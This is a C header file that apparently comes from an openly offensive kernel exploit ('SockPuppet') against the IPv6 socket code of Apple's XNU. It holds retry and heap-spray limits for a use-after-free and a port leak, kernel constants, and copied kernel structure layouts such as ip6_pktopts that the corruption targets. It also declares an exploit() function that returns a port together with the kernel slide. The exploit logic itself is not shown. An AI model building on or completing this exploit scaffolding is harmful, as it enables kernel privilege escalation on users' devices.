#ifndef SOCKPUPPET_H
#define SOCKPUPPET_H

#include <netinet/in.h>

#include "common.h"

#define MAX_UAF_ATTEMPTS        50
#define MAX_PORTLEAK_ATTEMPTS   50
#define MAX_SPRAY_ATTEMPTS      1000

#define MAX_UAF_RETRY           10
#define MAX_PORTLEAK_RETRY      1000

#define IPV6_USE_MIN_MTU        42
#define IPV6_PKTINFO            46
#define IPV6_PREFER_TEMPADDR    63

#define IO_BITS_ACTIVE          0x80000000
#define IKOT_TASK               2
#define IKOT_NONE               0

#define WQT_QUEUE               0x2
#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct route_in6 {
    struct rtentry *ro_rt;
    struct llentry *ro_lle;
    struct ifaddr *ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr *ip6po_rhi_rthdr; // Routing header
    struct route_in6 ip6po_rhi_route; // Route to the 1st hop
};

struct ip6po_nhinfo {
    struct sockaddr *ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route; // Route to the nexthop
};

struct ip6_pktopts {
    struct mbuf *ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo *ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh *ip6po_hbh;
    struct ip6_dest *ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest *ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

mach_port_t exploit(addr_t* kslide);

#endif
